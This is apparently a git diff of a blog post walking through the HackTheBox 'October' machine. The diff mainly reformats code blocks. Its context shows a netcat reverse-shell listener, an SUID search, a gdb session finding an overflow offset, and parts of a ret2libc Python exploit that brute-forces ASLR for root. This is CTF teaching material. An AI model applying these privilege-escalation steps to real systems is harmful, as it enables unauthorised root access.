@@ -4,6 +4,10 @@ title:  "HackTheBox - October"
 date:   2017-07-25 19:00:00 +0100
 categories: [hackthebox]
 description: Solutions for HackTheBox October
+image:
+  feature: october.jpg
+  credit:
+  creditlink:
 ---
 **Edit**: A few months on and i have found my understanding and explanation of some of the concepts here lacking to say the least.  As a result, I have decided to improve the explanations offered here.
 
@@ -15,10 +19,10 @@ First things first, we attack the device using an nmap scan.
 
 In this post I've just scanned all ports but I've found a much more efficient way to do it is to scan the host with a faster scan, just to get a view of the ports and then use the 'all-scripts' option on those resulting ports.  This may be how it operates under the hood but I found the following to be the most efficient combination.
 
-{% highlight bash %}
+```bash
 nmap -p- -T4 [host]
 nmap -p [ports] -A [host]
-{%endhighlight%}
+```
 
 The '-A' flag just tells it to run all scripts.
 
@@ -64,7 +68,7 @@ Following the exploit for shell upload we saw earlier, we navigate to the media 
 ![MyOhMy](/assets/images/October/2.png)
 
 So we open a netcat listener on our chosen port which will listen for the connection from the remote server when we execute the php script.
-{%highlight bash%}
+```bash
 root@kali:~/Desktop# nc -lvp 1234
 listening on [any] 1234 ...
 10.10.10.16: inverse host lookup failed: Unknown host
@@ -84,7 +88,7 @@ $ find -perm -4000 2>/dev/null
 ./usr/local/bin/ovrflw
 $ /usr/local/bin/ovrflw
 Syntax: ./ovrflw <input string>
-{%endhighlight%}
+```
 One of the first things I normally do is look for suid files which allow us to more easily escalate.  An SUID executable is a program that runs with the privileges of the file owner as opposed to the user running it.  In Linux there are three levels of permissions.  Owner, Group and Everyone.  Each file will have a user and group owner.  Both of these will have permissions relating to allowing them to read, write or execute that file as will everyone who is not these two.  These rules do not apply to the user root, who can do anything.  In effect, if you run an SUID file owned by root, no matter what user you are, you will run the program as root.
 
 I won't go into great detail on this but it's absolutely worth a read up on as it's a fundamental part of a large number of exploits. 
@@ -96,10 +100,10 @@ Smash The Stack
 A buffer overflow works in the following manner.  While we're all familiar with the basics, it's always helpful to reiterate what's happening.  
 
 Imagine a situation like this:
-{%highlight c%}
+```c
 char buf[5];
 strcpy(buf, "123456");
-{%endhighlight%}
+```
 
 We can see an issue almost immediately, in that we're copying a string of length 6 into a buffer of length 5.  The program won't start dying immediately, as the buffer will be stored on what's known as the stack.  The `char buf[5]` line merely reserves 5 bytes on the stack, so without any checks in place in our code, any operation to write beyond that will just write to areas of the stack used for something else.  
 
@@ -110,7 +114,7 @@ Finding EIP Offset
 
 The program reads in a string as an argument and then doesn't appear to do much with it.  Using /usr/share/metasploit-framework/tools/pattern_create.rb, we can create a string, pass it into the program, examine the registers and see at what value the eip register was overwritten with.
 
-{%highlight bash%}
+```bash
 $ gdb -q ovrflw
 Reading symbols from ovrflw...(no debugging symbols found)...done.
 (gdb) break *main+48
@@ -163,7 +167,7 @@ ds             0x7b 123
 es             0x7b 123
 fs             0x0 0
 gs             0x33 51
-{%endhighlight%}
+```
 From this we see our eip register is overwritten with 0x64413764, so passing that into /usr/share/metasploit-framework/tools/pattern_offset.rb, we get an offset of 112.  So we need to write 112 characters and then write the address of the instructions we want to be executed.
 
 DEP
@@ -174,21 +178,21 @@ This executable has been compiled with what is known as data execution preventio
 
 We just need to use a technique called ret2libc.  Instead of overwriting EIP with the address of our buffer, we'll just put the address of a function in the C library, such as system, which we'll use to call 'bin/sh' and give us a root shell.  This is much easier than it sounds, firstly we just need to find the offset of the system function in libc.
 
-{%highlight bash%}
+```bash
 readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
-{%endhighlight%}
+```
 
 This will give us our offset.  Now we need to find the same offset for the exit function.  This isn't completely necessary but it means that once we exit the shell, it will exit cleanly rather than segfaulting.  We're giving something for the program to return to once our shell is done.  It's exactly the same process as above.
 
 We also need to find the location of a /bin/sh string which we can do using:
-{%highlight bash%}
+```bash
 strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
-{%endhighlight%}
+```
 
 And now we just get the memory location of our libc.so.6, so we can construct the full memory address of our functions.
-{%highlight bash%}
+```bash
 ldd ovrflw | grep libc
-{%endhighlight%}
+```
 If we wanted this to go off without a hitch, these would be constant, but give it a go and you'll see a different result each time.
 
 ASLR
@@ -201,7 +205,7 @@ Below is the resulting exploit.
 
 Code was adapted from [https://sploitfun.wordpress.com/2015/05/08/bypassing-aslr-part-ii/](https://sploitfun.wordpress.com/2015/05/08/bypassing-aslr-part-ii/)
 
-{%highlight python%}
+```python
 import struct
 from subprocess import call
 #We need to find the libc offset, but since it's going to be aslr'd
@@ -233,7 +237,7 @@ while i < 256:
         i += 1
 
         ret = call(["/usr/local/bin/ovrflw", buf])
-{%endhighlight%}
+```
 
 
 
